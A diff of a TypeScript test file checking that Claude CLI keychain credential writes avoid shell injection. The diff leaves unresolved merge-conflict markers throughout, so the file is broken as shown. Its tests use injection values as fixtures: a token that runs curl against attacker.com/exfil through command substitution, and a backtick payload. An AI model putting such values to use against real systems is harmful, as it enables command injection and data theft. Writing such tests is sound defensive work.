@@ -1,7 +1,10 @@
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
+<<<<<<< HEAD
 
+=======
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 
 const execSyncMock = vi.fn();
@@ -9,7 +12,10 @@ const execFileSyncMock = vi.fn();
 
 describe("cli credentials", () => {
   beforeEach(() => {
+<<<<<<< HEAD
     vi.resetModules();
+=======
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     vi.useFakeTimers();
   });
 
@@ -23,9 +29,15 @@ describe("cli credentials", () => {
   });
 
   it("updates the Claude Code keychain item in place", async () => {
+<<<<<<< HEAD
     execSyncMock.mockImplementation((command: unknown) => {
       const cmd = String(command);
       if (cmd.includes("find-generic-password")) {
+=======
+    execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+      const argv = Array.isArray(args) ? args.map(String) : [];
+      if (String(file) === "security" && argv.includes("find-generic-password")) {
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
         return JSON.stringify({
           claudeAiOauth: {
             accessToken: "old-access",
@@ -37,8 +49,11 @@ describe("cli credentials", () => {
       return "";
     });
 
+<<<<<<< HEAD
     execFileSyncMock.mockReturnValue("");
 
+=======
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
     const ok = writeClaudeCliKeychainCredentials(
@@ -47,25 +62,47 @@ describe("cli credentials", () => {
         refresh: "new-refresh",
         expires: Date.now() + 60_000,
       },
+<<<<<<< HEAD
       { execSync: execSyncMock, execFileSync: execFileSyncMock },
+=======
+      { execFileSync: execFileSyncMock },
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     );
 
     expect(ok).toBe(true);
 
     // Verify execFileSync was called with array args (no shell interpretation)
+<<<<<<< HEAD
     expect(execFileSyncMock).toHaveBeenCalledTimes(1);
     const [binary, args] = execFileSyncMock.mock.calls[0];
     expect(binary).toBe("security");
     expect(args).toContain("add-generic-password");
     expect(args).toContain("-U");
+=======
+    expect(execFileSyncMock).toHaveBeenCalledTimes(2);
+    const addCall = execFileSyncMock.mock.calls.find(
+      ([binary, args]) =>
+        String(binary) === "security" &&
+        Array.isArray(args) &&
+        (args as unknown[]).map(String).includes("add-generic-password"),
+    );
+    expect(addCall?.[0]).toBe("security");
+    expect((addCall?.[1] as string[] | undefined) ?? []).toContain("-U");
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
   });
 
   it("prevents shell injection via malicious OAuth token values", async () => {
     const maliciousToken = "x'$(curl attacker.com/exfil)'y";
 
+<<<<<<< HEAD
     execSyncMock.mockImplementation((command: unknown) => {
       const cmd = String(command);
       if (cmd.includes("find-generic-password")) {
+=======
+    execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+      const argv = Array.isArray(args) ? args.map(String) : [];
+      if (String(file) === "security" && argv.includes("find-generic-password")) {
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
         return JSON.stringify({
           claudeAiOauth: {
             accessToken: "old-access",
@@ -77,8 +114,11 @@ describe("cli credentials", () => {
       return "";
     });
 
+<<<<<<< HEAD
     execFileSyncMock.mockReturnValue("");
 
+=======
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
     const ok = writeClaudeCliKeychainCredentials(
@@ -87,26 +127,51 @@ describe("cli credentials", () => {
         refresh: "safe-refresh",
         expires: Date.now() + 60_000,
       },
+<<<<<<< HEAD
       { execSync: execSyncMock, execFileSync: execFileSyncMock },
+=======
+      { execFileSync: execFileSyncMock },
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     );
 
     expect(ok).toBe(true);
 
     // The -w argument must contain the malicious string literally, not shell-expanded
+<<<<<<< HEAD
     const [, args] = execFileSyncMock.mock.calls[0];
     const wIndex = (args as string[]).indexOf("-w");
     const passwordValue = (args as string[])[wIndex + 1];
     expect(passwordValue).toContain(maliciousToken);
     // Verify it was passed as a direct argument, not built into a shell command string
     expect(execFileSyncMock.mock.calls[0][0]).toBe("security");
+=======
+    const addCall = execFileSyncMock.mock.calls.find(
+      ([binary, args]) =>
+        String(binary) === "security" &&
+        Array.isArray(args) &&
+        (args as unknown[]).map(String).includes("add-generic-password"),
+    );
+    const args = (addCall?.[1] as string[] | undefined) ?? [];
+    const wIndex = args.indexOf("-w");
+    const passwordValue = args[wIndex + 1];
+    expect(passwordValue).toContain(maliciousToken);
+    // Verify it was passed as a direct argument, not built into a shell command string
+    expect(addCall?.[0]).toBe("security");
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
   });
 
   it("prevents shell injection via backtick command substitution in tokens", async () => {
     const backtickPayload = "token`id`value";
 
+<<<<<<< HEAD
     execSyncMock.mockImplementation((command: unknown) => {
       const cmd = String(command);
       if (cmd.includes("find-generic-password")) {
+=======
+    execFileSyncMock.mockImplementation((file: unknown, args: unknown) => {
+      const argv = Array.isArray(args) ? args.map(String) : [];
+      if (String(file) === "security" && argv.includes("find-generic-password")) {
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
         return JSON.stringify({
           claudeAiOauth: {
             accessToken: "old-access",
@@ -118,8 +183,11 @@ describe("cli credentials", () => {
       return "";
     });
 
+<<<<<<< HEAD
     execFileSyncMock.mockReturnValue("");
 
+=======
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     const { writeClaudeCliKeychainCredentials } = await import("./cli-credentials.js");
 
     const ok = writeClaudeCliKeychainCredentials(
@@ -128,15 +196,31 @@ describe("cli credentials", () => {
         refresh: backtickPayload,
         expires: Date.now() + 60_000,
       },
+<<<<<<< HEAD
       { execSync: execSyncMock, execFileSync: execFileSyncMock },
+=======
+      { execFileSync: execFileSyncMock },
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     );
 
     expect(ok).toBe(true);
 
     // Backtick payload must be passed literally, not interpreted
+<<<<<<< HEAD
     const [, args] = execFileSyncMock.mock.calls[0];
     const wIndex = (args as string[]).indexOf("-w");
     const passwordValue = (args as string[])[wIndex + 1];
+=======
+    const addCall = execFileSyncMock.mock.calls.find(
+      ([binary, args]) =>
+        String(binary) === "security" &&
+        Array.isArray(args) &&
+        (args as unknown[]).map(String).includes("add-generic-password"),
+    );
+    const args = (addCall?.[1] as string[] | undefined) ?? [];
+    const wIndex = args.indexOf("-w");
+    const passwordValue = args[wIndex + 1];
+>>>>>>> 66d7178f2 (fix(security): eliminate shell from Claude CLI keychain refresh)
     expect(passwordValue).toContain(backtickPayload);
   });
 
